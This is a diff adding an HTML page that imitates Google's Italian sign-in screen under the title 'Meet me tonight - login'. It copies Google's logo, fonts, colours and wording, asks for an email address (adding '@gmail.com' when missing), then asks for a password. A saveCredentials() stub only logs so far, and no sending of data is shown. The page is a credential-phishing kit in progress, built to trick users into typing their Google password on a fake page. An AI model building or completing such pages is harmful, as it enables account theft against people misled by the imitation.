@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/@mdi/font@3.x/css/materialdesignicons.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css?family=Material+Icons" rel="stylesheet">
+
+  <script src="jquery.min.js"></script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
+
+  <title>Meet me tonight - login</title>
+
+  <style>
+    .center {
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      width: 50%;
+    }
+
+    .show{
+      /* border: 1px dotted gray; */
+    }
+
+    #nonricordiemailbutton, #nonricordipasswordbutton, #ulterioriinformazioni{
+      border-radius: 4px;
+      color: #1a73e8;
+      display: inline-block;
+      font-weight: 500;
+      letter-spacing: .25px;
+      background-color: transparent;
+      border: 0;
+      cursor: pointer;
+      font-size: inherit;
+      outline: 0;
+      padding: 0;
+      text-align: left;
+      font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
+      -webkit-appearance: button;
+      -webkit-writing-mode: horizontal-tb !important;
+      text-rendering: auto;
+      word-spacing: normal;
+      text-transform: none;
+      text-indent: 0px;
+      align-items: flex-start;
+      text-shadow: none;
+      margin: 0em;
+      font-size: 15px;
+    }
+
+    #creaaccountbutton{
+      color: #1a73e8;
+      line-height: 1.4286;
+      font-weight: 400;
+      font-size: 14px;
+      text-transform: none;
+      max-width: 300px;
+      display: inline-block;
+    }
+
+    #avantibutton, #submitbutton{
+      background: #1a73e8;
+      color: #fff;
+      padding: 7px 20px 7px 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      text-align: center;
+      outline: none;
+    }
+
+    #profileIdentifier{
+      font-family: roboto,'Noto Sans Myanmar UI',arial,sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <v-app>
+      <v-content>
+        <div class="" id="logo">
+          <img style="width: 20%; padding: 0px;" class="center" src="google-logo.png">
+        </div>
+
+        <!-- EMAIL INPUT PAGE -->
+        <section id="emailInputSection">
+
+          <div class="" style="text-align: center; padding-top: 0px; margin-top: -15px;">
+            <h1>
+              <span id="accedititolo"
+                style="font-size: 24px;
+                font-weight: 400;
+                line-height: 31.9992px;
+                font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+                color: #202124;">
+                Accedi
+              </span>
+            </h1>
+          </div>
+
+          <div class="" style="text-align: center; padding-top: 0px; margin-bottom: 20px;">
+            <span id="continuasugmail" style="font-size: 16px;
+              color: #202124;
+              font-weight: 400;
+              letter-spacing: .1px;
+              font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+              line-height: 1.5;">
+              Continua su Gmail
+            </span>
+          </div>
+
+          <!-- EMAIL TEXTBOX -->
+          <v-form v-model="validEmail" ref="form1">
+            <v-col class="" cols="12" sm="6" md="3" id="inputEmailBox">
+              <v-text-field
+              id="inputEmail"
+              label="Indirizzo email o numero di telefono"
+              outlined
+              :rules="rules.emailRules"
+              v-model="email"
+              ></v-text-field>
+            </v-col>
+          </v-form>
+
+
+          <div id="nonricordiemail" class="" style="padding-left: 15px; padding-right: 20px; margin-top: -25px;">
+            <button id="nonricordiemailbutton" type="button">Non ricordi l'indirizzo email?</button>
+
+            <br><br>
+          </div>
+
+
+
+
+          <!-- guest mode info -->
+          <div id="modalitaospitesection" class="" style="padding-left: 15px; padding-right: 20px; color: #5f6368;
+          font-size: 14px;
+          line-height: 1.4286;">Non si tratta del tuo computer? Utilizza la modalità ospite per accedere privatamente. <br> <button type="button" id="ulterioriinformazioni"><a style="text-decoration: none;" href="https://support.google.com/chrome/answer/6130773?hl=it">Ulteriori informazioni</a></button>
+
+            <br><br>
+          </div>
+
+
+          <table class="show" style="margin-left: 12px; margin-right: 20px; width: 95%;">
+            <tr>
+              <td class="show" style="width: 75%">
+                <span id="creaaccountbutton">Crea un account</span>
+              </td>
+              <td class="show" style="text-align: right; width: 25%">
+                <button id="avantibutton" type="button" name="button" onclick="gotoPasswordInput()">Avanti</button>
+              </td>
+            </tr>
+          </table>
+        </section>
+
+
+        <!-- PASSWORD INPUT PAGE -->
+        <section id="passwordInputSection" style="display:none; margin-top: 10px;">
+
+          <div class="" style="text-align: center; padding-top: 0px; margin-top: -25px;">
+            <h1>
+              <span id="accedititolo"
+                style="font-size: 24px;
+                font-weight: 400;
+                line-height: 31.9992px;
+                font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;
+                color: #202124;">
+                Ciao
+              </span>
+            </h1>
+
+            <v-chip color="" outlined>
+              <v-avatar left>
+                <svg style="filter: invert(0.2);">
+                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                </svg>
+              </v-avatar>
+              <span style="font-size: 14px;" id="profileIdentifier">{{email}}</span>
+            </v-chip>
+
+            <br><br>
+          </div>
+
+          <v-form v-model="validPassword" ref="form2">
+            <v-col class="" cols="12" sm="6" md="3" id="inputPasswordBox">
+              <v-text-field
+              id="inputPassword"
+              label="Inserisci la password"
+              outlined
+              :rules="rules.passwordRules"
+              :append-icon="showPass ? 'visibility' : 'visibility_off'"
+              :type="showPass ? 'text' : 'password'"
+              @click:append="showPass = !showPass"
+              ></v-text-field>
+            </v-col>
+          </v-form>
+
+          <br>
+
+          <table class="show" style="margin-top: -20px; margin-left: 12px; margin-right: 20px; width: 95%;">
+            <tr>
+              <td class="show" style="width: 75%">
+                <button id="nonricordipasswordbutton" type="button">Password dimenticata?</button>
+              </td>
+              <td class="show" style="text-align: right; width: 25%">
+                <button id="submitbutton" type="button" name="button" onclick="gotoPasswordInput()">Avanti</button>
+              </td>
+            </tr>
+          </table>
+
+        </section>
+      </v-content>
+    </v-app>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue@2.x/dist/vue.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vuetify@2.x/dist/vuetify.js"></script>
+  <script>
+    let app = new Vue({
+      el: '#app',
+      vuetify: new Vuetify(),
+      data: {
+        email: "",
+        validEmail: null,
+        password: "",
+        validPassword: null,
+        showPass: false,
+        rules: {
+          emailRules: [
+            v => !!v || 'Inserisci un indirizzo email o un numero di telefono'
+          ],
+          passwordRules: [
+            v => !!v || 'Immetti una password'
+          ],
+        },
+      }
+    })
+
+    function gotoPasswordInput() {
+      app.$refs.form1.validate()
+
+      if (app.email != '') {
+        if (app.email.indexOf("@gmail.com") == -1) {
+          app.email += "@gmail.com"
+        }
+        // Hide all elements of the first section and show the second section
+        $('#emailInputSection').hide()
+        $('#passwordInputSection').show()
+      }
+    }
+
+    // When the user has filled out both email and password fields and click next
+    function saveCredentials() {
+      console.log("save credentials");
+    }
+  </script>
+</body>
+</html>
